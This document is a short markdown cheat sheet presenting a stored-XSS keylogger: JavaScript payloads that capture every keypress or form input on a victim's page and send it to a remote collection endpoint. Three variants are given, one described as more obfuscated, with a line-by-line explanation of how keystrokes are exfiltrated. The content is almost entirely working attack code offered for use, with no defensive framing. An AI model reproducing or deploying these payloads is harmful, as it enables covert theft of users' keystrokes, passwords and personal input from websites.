# XSS Keylogger via Stored XSS

> Use a stored XSS vulnerability to log keystrokes from a victim and send them to a remote server.

## My keylogger payload script
```js
<script>
document.onkeypress = function(e) {
  fetch("https://eodo5udpevensc2.m.pipedream.net/?" + 
    new URLSearchParams({ key: e.key }));
};
</script>
```
## Code explained
- `document.onkeypress`	:Captures every keypress on the page
- `fetch()`	:Sends the key to your Pipedream server
- `URLSearchParams`	:Encodes the key cleanly into the URL

## More obfuscated payload
```js
<script>
document.onkeypress = function(e){
  new Image().src="https://eodo5udpevensc2.m.pipedream.net/?" + "k=" + e.key;
};
</script>
```

```js
document.oninput = function(e) {
  fetch("https://your-server.net?" + "input=" + e.target.value);
};

```
